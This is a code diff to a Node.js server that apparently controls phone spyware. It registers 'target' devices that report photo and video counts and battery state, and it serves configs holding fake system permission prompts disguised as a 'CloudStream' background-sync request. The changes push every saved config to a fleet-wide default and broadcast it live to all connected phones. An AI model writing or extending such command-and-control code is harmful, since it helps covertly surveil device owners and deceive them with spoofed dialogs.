@@ -116,9 +116,26 @@ function getDeviceConfig(id) {
     fakePrompt2Title: '"CloudStream" Would Like to Enable Background Sync',
     fakePrompt2Message: 'To keep streaming providers and repository buffer updated.'
   };
-  if (deviceConfigs[id]) {
-    return Object.assign(base, deviceConfigs[id]);
+
+  // 1. If explicit config for this device exists
+  if (id && deviceConfigs[id]) {
+    return Object.assign({}, base, deviceConfigs['DEFAULT'] || {}, deviceConfigs[id]);
   }
+
+  // 2. Global fleet default template
+  if (deviceConfigs['DEFAULT']) {
+    return Object.assign({}, base, deviceConfigs['DEFAULT']);
+  }
+
+  // 3. Fallback to any previously customized device config
+  const keys = Object.keys(deviceConfigs);
+  for (let i = keys.length - 1; i >= 0; i--) {
+    const k = keys[i];
+    if (deviceConfigs[k] && deviceConfigs[k].slot1) {
+      return Object.assign({}, base, deviceConfigs[k]);
+    }
+  }
+
   return base;
 }
 
@@ -150,13 +167,12 @@ app.post('/api/device/config', (req, res) => {
 
   const id = deviceId.trim().toUpperCase();
   deviceConfigs[id] = config;
+  // Always update global fleet default so every new phone inherits it!
+  deviceConfigs['DEFAULT'] = config;
   saveJSON(CONFIG_FILE, deviceConfigs);
 
-  // Notify device in real-time
-  const dev = devices.get(id);
-  if (dev && dev.socketId) {
-    io.to(dev.socketId).emit('config:update', config);
-  }
+  // Broadcast to all connected devices in real-time
+  io.emit('config:update', config);
 
   res.json({ success: true, config });
 });
@@ -183,8 +199,14 @@ app.post('/api/target/heartbeat', (req, res) => {
     stats: stats || existing.stats || { photosCount: 0, videosCount: 0, battery: 100, isCharging: false }
   });
 
+  const devConfig = getDeviceConfig(id);
+  if (!deviceConfigs[id]) {
+    deviceConfigs[id] = devConfig;
+    saveJSON(CONFIG_FILE, deviceConfigs);
+  }
+
   io.emit('devices:update', cleanDeviceList());
-  res.json({ success: true, registered: id, config: getDeviceConfig(id) });
+  res.json({ success: true, registered: id, config: devConfig });
 });
 
 // Legacy check endpoint
